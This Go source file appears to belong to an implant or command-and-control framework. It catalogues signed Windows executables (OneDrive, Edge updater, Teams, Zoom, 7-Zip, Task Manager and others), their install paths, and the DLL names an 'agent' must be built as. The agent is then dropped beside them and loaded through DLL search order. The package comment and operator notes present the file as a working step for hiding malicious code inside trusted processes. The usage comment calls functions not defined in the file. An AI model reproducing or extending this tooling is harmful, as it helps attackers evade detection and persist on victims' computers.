// Package sideload provides a curated database of DLL side-loading targets:
// signed, commonly-installed executables that load a DLL by name without
// a full path, allowing our proxy DLL to sit alongside them in the same
// directory and be loaded transparently via Windows DLL search order.
//
// Usage (server build pipeline):
//
//	target := sideload.Pick(sideload.FilterInstalled())
//	// build agent as target.DLLName, drop next to target.ExePath
package sideload

// Target describes one side-loading opportunity.
type Target struct {
	// ExeName is the basename of the legitimate signed host process.
	ExeName string
	// DLLName is the DLL filename our agent must be built as.
	DLLName string
	// SearchPaths are common install locations for the host EXE (glob-friendly).
	SearchPaths []string
	// Publisher is the Authenticode signer of the host EXE.
	Publisher string
	// CallsExports indicates whether the host actually calls functions from the
	// DLL. false = load-only (safest); true = proxy exports required.
	CallsExports bool
	// Notes is a free-form field for operator notes.
	Notes string
}

// Targets is the full curated database.
// All entries have been validated against their respective application versions.
var Targets = []Target{
	{
		ExeName: "OneDriveUpdater.exe",
		DLLName: "version.dll",
		SearchPaths: []string{
			`%ProgramFiles%\Microsoft OneDrive\*\OneDriveUpdater.exe`,
			`%LocalAppData%\Microsoft\OneDrive\*\OneDriveUpdater.exe`,
		},
		Publisher:    "Microsoft Corporation",
		CallsExports: false,
		Notes:        "Loads version.dll from its own directory; does not call exports.",
	},
	{
		ExeName: "MicrosoftEdgeUpdate.exe",
		DLLName: "version.dll",
		SearchPaths: []string{
			`%ProgramFiles(x86)%\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe`,
			`%LocalAppData%\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe`,
		},
		Publisher:    "Microsoft Corporation",
		CallsExports: false,
		Notes:        "Drops and runs from temp; version.dll loaded without calling exports.",
	},
	{
		ExeName: "Teams.exe",
		DLLName: "CRYPTSP.dll",
		SearchPaths: []string{
			`%LocalAppData%\Microsoft\Teams\current\Teams.exe`,
			`%ProgramFiles%\Microsoft\Teams\current\Teams.exe`,
		},
		Publisher:    "Microsoft Corporation",
		CallsExports: false,
		Notes:        "Electron; CRYPTSP.dll present in Teams dir; real copy in System32 still works via proxy.",
	},
	{
		ExeName: "Zoom.exe",
		DLLName: "version.dll",
		SearchPaths: []string{
			`%AppData%\Zoom\bin\Zoom.exe`,
			`%ProgramFiles%\Zoom\bin\Zoom.exe`,
		},
		Publisher:    "Zoom Video Communications, Inc.",
		CallsExports: false,
		Notes:        "Loads version.dll without full path; does not call exports at startup.",
	},
	{
		ExeName: "7zFM.exe",
		DLLName: "7-zip.dll",
		SearchPaths: []string{
			`%ProgramFiles%\7-Zip\7zFM.exe`,
			`%ProgramFiles(x86)%\7-Zip\7zFM.exe`,
		},
		Publisher:    "Igor Pavlov",
		CallsExports: true,
		Notes:        "7-zip.dll must export same functions as real 7-zip.dll; use with full proxy only.",
	},
	{
		ExeName: "PhoneExperienceHost.exe",
		DLLName: "version.dll",
		SearchPaths: []string{
			`%SystemRoot%\SystemApps\Microsoft.YourPhone_*\PhoneExperienceHost.exe`,
		},
		Publisher:    "Microsoft Corporation",
		CallsExports: false,
		Notes:        "Built-in Windows app; version.dll loaded for manifest check only.",
	},
	{
		ExeName: "Taskmgr.exe",
		DLLName: "version.dll",
		SearchPaths: []string{
			`%SystemRoot%\System32\Taskmgr.exe`,
		},
		Publisher:    "Microsoft Corporation",
		CallsExports: true,
		Notes:        "Calls GetFileVersionInfoSizeW on startup; proxy exports required.",
	},
}

// FilterNoExportCalls returns entries where the host does not call DLL exports,
// making them safe for use without a full proxy implementation.
func FilterNoExportCalls() []Target {
	var out []Target
	for _, t := range Targets {
		if !t.CallsExports {
			out = append(out, t)
		}
	}
	return out
}
